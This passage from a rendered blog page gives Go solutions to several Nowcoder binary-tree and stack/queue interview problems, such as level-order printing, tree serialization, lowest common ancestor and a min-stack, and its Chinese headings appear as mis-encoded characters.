id="æŠŠäºŒå‰æ ‘æ‰“å°æˆå¤šè¡Œ"><a href="#æŠŠäºŒå‰æ ‘æ‰“å°æˆå¤šè¡Œ" class="headerlink" title="æŠŠäºŒå‰æ ‘æ‰“å°æˆå¤šè¡Œ"></a>æŠŠäºŒå‰æ ‘æ‰“å°æˆå¤šè¡Œ</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRoot TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹äºŒç»´æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Print</span><span class="params">( pRoot *TreeNode )</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pRoot == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans := [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    q := []*TreeNode&#123;pRoot&#125;</span><br><span class="line">    tmpans := []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    tmpq := []*TreeNode&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">len</span>(q)&gt;<span class="number">0</span>&#123;</span><br><span class="line">        length := <span class="built_in">len</span>(q)</span><br><span class="line">        tmpans = []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">        tmpq = []*TreeNode&#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;length;i++ &#123;</span><br><span class="line">            tmpans = <span class="built_in">append</span>(tmpans,q[i].Val)</span><br><span class="line">            <span class="keyword">if</span> q[i].Left != <span class="literal">nil</span> &#123;</span><br><span class="line">                tmpq = <span class="built_in">append</span>(tmpq,q[i].Left)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> q[i].Right != <span class="literal">nil</span> &#123;</span><br><span class="line">                tmpq = <span class="built_in">append</span>(tmpq,q[i].Right)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = <span class="built_in">append</span>(ans,tmpans)</span><br><span class="line">        q = tmpq</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åºåˆ—åŒ–äºŒå‰æ ‘"><a href="#åºåˆ—åŒ–äºŒå‰æ ‘" class="headerlink" title="åºåˆ—åŒ–äºŒå‰æ ‘"></a>åºåˆ—åŒ–äºŒå‰æ ‘</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;strconv&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param root TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @return TreeNodeç±»</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Serialize</span><span class="params">(root *TreeNode)</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="comment">// write code here</span></span><br><span class="line">sb := &amp;strings.Builder&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> dfs <span class="function"><span class="keyword">func</span><span class="params">(root *TreeNode)</span></span></span><br><span class="line">dfs = <span class="function"><span class="keyword">func</span><span class="params">(root *TreeNode)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> root == <span class="literal">nil</span> &#123;</span><br><span class="line">sb.WriteString(<span class="string">&quot;#,&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">sb.WriteString(strconv.Itoa(root.Val))</span><br><span class="line">sb.WriteString(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">dfs(root.Left)</span><br><span class="line">dfs(root.Right)</span><br><span class="line">&#125;</span><br><span class="line">dfs(root)</span><br><span class="line"><span class="comment">//     fmt.Println(sb.String())</span></span><br><span class="line"><span class="keyword">return</span> sb.String()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Deserialize</span><span class="params">(s <span class="keyword">string</span>)</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line"><span class="comment">// write code here</span></span><br><span class="line">sp := strings.Split(s, <span class="string">&quot;,&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> dfs <span class="function"><span class="keyword">func</span><span class="params">()</span> *<span class="title">TreeNode</span></span></span><br><span class="line">dfs = <span class="function"><span class="keyword">func</span><span class="params">()</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sp) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> sp[<span class="number">0</span>] == <span class="string">&quot;#&quot;</span> &#123;</span><br><span class="line">sp = sp[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">num, _ := strconv.Atoi(sp[<span class="number">0</span>])</span><br><span class="line">sp = sp[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">return</span> &amp;TreeNode&#123;num, dfs(), dfs()&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dfs()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„-ä¸‰"><a href="#äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„-ä¸‰" class="headerlink" title="äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„(ä¸‰)"></a>äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„(ä¸‰)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param root TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @param sum intæ•´å‹ </span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FindPath</span><span class="params">(root *TreeNode, sum <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="comment">// write code here</span></span><br><span class="line">ans := <span class="number">0</span></span><br><span class="line">maps := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>, <span class="number">100</span>)</span><br><span class="line">maps[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line"><span class="comment">// é—­åŒ…å‡½æ•°é€’å½’è‡ªå·±ã€‚</span></span><br><span class="line"><span class="keyword">var</span> dfsl <span class="function"><span class="keyword">func</span><span class="params">(root *TreeNode, currentSum <span class="keyword">int</span>)</span></span></span><br><span class="line">dfsl = <span class="function"><span class="keyword">func</span><span class="params">(root *TreeNode, currentSum <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> root == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">currentSum += root.Val</span><br><span class="line"><span class="keyword">if</span> _, ok := maps[currentSum-sum]; ok &#123;</span><br><span class="line">ans += maps[currentSum-sum]</span><br><span class="line">&#125;</span><br><span class="line">maps[currentSum]++</span><br><span class="line">dfsl(root.Left, currentSum)</span><br><span class="line">dfsl(root.Right, currentSum)</span><br><span class="line">maps[currentSum]--</span><br><span class="line">&#125;</span><br><span class="line">dfsl(root, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åœ¨äºŒå‰æ ‘ä¸­æ‰¾åˆ°ä¸¤ä¸ªèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ"><a href="#åœ¨äºŒå‰æ ‘ä¸­æ‰¾åˆ°ä¸¤ä¸ªèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ" class="headerlink" title="åœ¨äºŒå‰æ ‘ä¸­æ‰¾åˆ°ä¸¤ä¸ªèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ"></a>åœ¨äºŒå‰æ ‘ä¸­æ‰¾åˆ°ä¸¤ä¸ªèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param root TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @param o1 intæ•´å‹ </span></span><br><span class="line"><span class="comment"> * @param o2 intæ•´å‹ </span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lowestCommonAncestor</span><span class="params">( root *TreeNode ,  o1 <span class="keyword">int</span> ,  o2 <span class="keyword">int</span> )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    node := lCA(root, o1, o2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> node.Val</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lCA</span><span class="params">(root *TreeNode, o1 <span class="keyword">int</span>, o2 <span class="keyword">int</span>)</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> root == <span class="literal">nil</span> || root.Val == o1 || root.Val == o2 &#123;</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//     lCAæ±‚å¾—o1ã€o2çš„æœ€è¿‘å…¬å…±ç¥–å…ˆï¼Œleftå»å·¦å­æ ‘ä¸­å¯»æ‰¾ï¼Œrightå»å³å­æ ‘ä¸­å¯»æ‰¾</span></span><br><span class="line"><span class="comment">//     leftä¸ºç©ºè¯´æ˜å·¦å­æ ‘ä¸­ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬å»å³å­æ ‘ä¸­å¯»æ‰¾å³å¯ï¼›rightä¸ºç©ºè¯´æ˜å³å­æ ‘ä¸­ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬</span></span><br><span class="line"><span class="comment">//     å»å·¦å­æ ‘ä¸­å¯»æ‰¾ï¼›å½“leftã€rightå‡ä¸ä¸ºç©ºæ—¶ï¼Œè¯´æ˜ä¸¤ä¸ªèŠ‚ç‚¹åˆ†åˆ«åè½äºleftå’Œrightä¸­ï¼Œè¿”å›</span></span><br><span class="line"><span class="comment">//     æ­¤æ—¶çš„æ ¹èŠ‚ç‚¹rootå³å¯</span></span><br><span class="line">    left := lCA(root.Left, o1, o2)</span><br><span class="line">    right := lCA(root.Right, o1, o2)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> left == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> right</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> right == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> left</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ"><a href="#äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ" class="headerlink" title="äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ"></a>äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param root TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @param p intæ•´å‹ </span></span><br><span class="line"><span class="comment"> * @param q intæ•´å‹ </span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lowestCommonAncestor</span><span class="params">( root *TreeNode ,  p <span class="keyword">int</span> ,  q <span class="keyword">int</span> )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> root.Val &gt; p &amp;&amp; root.Val &gt; q &#123;</span><br><span class="line">        <span class="keyword">return</span> lowestCommonAncestor(root.Left,p,q)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> root.Val &lt; p &amp;&amp; root.Val &lt; q &#123;</span><br><span class="line">        <span class="keyword">return</span> lowestCommonAncestor(root.Right,p,q)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> root.Val</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é˜Ÿåˆ—-amp-æ ˆ"><a href="#é˜Ÿåˆ—-amp-æ ˆ" class="headerlink" title="é˜Ÿåˆ— &amp; æ ˆ"></a>é˜Ÿåˆ— &amp; æ ˆ</h2><h3 id="ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—"><a href="#ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—" class="headerlink" title="ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—"></a><strong>ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> stack1 [] <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> stack2 [] <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Push</span><span class="params">(node <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    stack1 = <span class="built_in">append</span>(stack1, node)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Pop</span><span class="params">()</span> <span class="title">int</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(stack2) == <span class="number">0</span>&#123;</span><br><span class="line">       <span class="keyword">for</span> idx := <span class="built_in">len</span>(stack1) - <span class="number">1</span>; idx &gt; <span class="number">-1</span>; idx--&#123;</span><br><span class="line">            stack2 = <span class="built_in">append</span>(stack2, stack1[idx])</span><br><span class="line">        &#125;</span><br><span class="line">        stack1 = []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    nums := stack2[<span class="built_in">len</span>(stack2)<span class="number">-1</span>]</span><br><span class="line">    stack2 = stack2[:<span class="built_in">len</span>(stack2)<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> nums</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŒ…å«minå‡½æ•°çš„æ ˆ"><a href="#åŒ…å«minå‡½æ•°çš„æ ˆ" class="headerlink" title="åŒ…å«minå‡½æ•°çš„æ ˆ"></a><strong>åŒ…å«minå‡½æ•°çš„æ ˆ</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> stack []<span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> minStack []<span class="keyword">int</span> = []<span class="keyword">int</span>&#123;math.MaxInt64&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Push</span><span class="params">(node <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    stack = <span class="built_in">append</span>(stack, node)</span><br><span class="line">minTop := min(node, minStack[<span class="built_in">len</span>(minStack)<span class="number">-1</span>])</span><br><span class="line">minStack = <span class="built_in">append</span>(minStack, minTop)</span><br><span class="line">&#125;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Pop</span><span class="params">()</span></span> &#123;</span><br><span class="line">stack = stack[:<span class="built_in">len</span>(stack)<span class="number">-1</span>]</span><br><span class="line">minStack = minStack[:<span class="built_in">len</span>(minStack)<span class="number">-1</span>]    <span class="comment">// write code here</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Top</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> stack[<span class="built_in">len</span>(stack)<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Min</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> minStack[<span class="built_in">len</span>(minStack)<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">min</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> a &lt;= b &#123;</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**container/listè§£æ³•</span></span><br><span class="line"><span class="comment">package main</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">import &quot;container/list&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">var mylist = list.New()</span></span><br><span class="line"><span class="comment">var minlist = list.New()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">func Push(node int) &#123;</span></span><br><span class="line"><span class="comment">// write code here</span></span><br><span class="line"><span class="comment">mylist.PushFront(node)</span></span><br><span class="line"><span class="comment">if minlist.Len() == 0 &#123;</span></span><br><span class="line"><span class="comment">minlist.PushFront(node)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if node &lt;= minlist.Front().Value.(int) &#123;</span></span><br><span class="line"><span class="comment">minlist.PushFront(node)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">func Pop() &#123;</span></span><br><span class="line"><span class="comment">// write code here</span></span><br><span class="line"><span class="comment">if mylist.Front().Value == minlist.Front().Value &#123;</span></span><br><span class="line"><span 